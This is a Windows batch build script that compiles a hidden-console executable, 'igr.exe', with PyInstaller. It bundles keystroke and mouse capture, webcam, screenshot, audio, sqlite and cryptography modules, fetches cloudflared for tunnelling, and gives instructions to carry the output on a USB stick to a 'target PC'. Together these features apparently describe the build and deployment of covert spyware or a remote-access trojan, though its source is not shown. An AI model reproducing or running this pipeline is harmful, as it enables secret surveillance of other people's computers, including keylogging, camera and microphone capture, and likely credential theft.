@echo off
echo ============================================
echo   IGR Build - Compiling executable
echo ============================================
echo.

echo [1/4] Installing PyInstaller...
pip install pyinstaller
if errorlevel 1 (
    echo ERROR: Failed to install PyInstaller
    pause
    exit /b 1
)

echo.
echo [2/4] Installing required packages...
pip install flask requests opencv-python pynput pillow pyaudio cryptography
echo.

echo [3/4] Downloading cloudflared if missing...
if not exist cloudflared.exe (
    echo Downloading cloudflared...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile 'cloudflared.exe'"
    if exist cloudflared.exe (
        echo   Downloaded cloudflared.exe
    ) else (
        echo   WARNING: cloudflared download failed - will auto-download on target PC
    )
) else (
    echo   cloudflared.exe already present
)

echo.
echo [4/4] Compiling igr.exe...
python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
    --hidden-import flask ^
    --hidden-import requests ^
    --hidden-import pynput.keyboard ^
    --hidden-import pynput.mouse ^
    --hidden-import cv2 ^
    --hidden-import PIL.Image ^
    --hidden-import PIL.ImageTk ^
    --hidden-import PIL.ImageGrab ^
    --hidden-import pyaudio ^
    --hidden-import cryptography ^
    --hidden-import cryptography.hazmat.primitives.ciphers.aead ^
    --hidden-import sqlite3 ^
    main.py

if not exist "dist\igr.exe" (
    echo.
    echo ERROR: Build failed - igr.exe not found in dist\
    pause
    exit /b 1
)

echo.
echo ============================================
echo   BUILD SUCCESSFUL
echo ============================================
echo   Output: dist\igr.exe
echo.
echo   Copy these to USB stick:
echo     1. dist\igr.exe
echo     2. cloudflared.exe
echo     3. setup.bat
echo ============================================
echo.
pause
